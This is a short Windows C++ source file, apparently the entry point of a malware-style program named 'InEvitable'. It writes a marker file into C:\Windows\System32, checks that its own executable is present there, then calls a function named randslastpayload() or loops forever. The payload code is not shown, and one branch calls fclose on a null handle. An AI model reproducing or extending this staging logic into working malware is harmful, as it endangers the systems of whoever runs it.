// InEvitable.cpp : Defines the entry point for the application.
//

#include "InEvitable.h"



int WINAPI __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	DWORD wb2;
	HANDLE note = CreateFileA("C:\\Windows\\System32\\hello.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);

	FILE* file;
	if (file = fopen("C:\\Windows\\System32\\InEvitable.exe", "r")) {
		fclose(file);
		int argc;
		LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
		if (file = fopen("C:\\Windows\\System32\\hello.txt", "r")) {
			fclose(file);
			randslastpayload();

		}
		else {
			fclose(file);
			for (;;) {
				Sleep(10000);
			}
		}
	}
	else {
		something();
	}
}
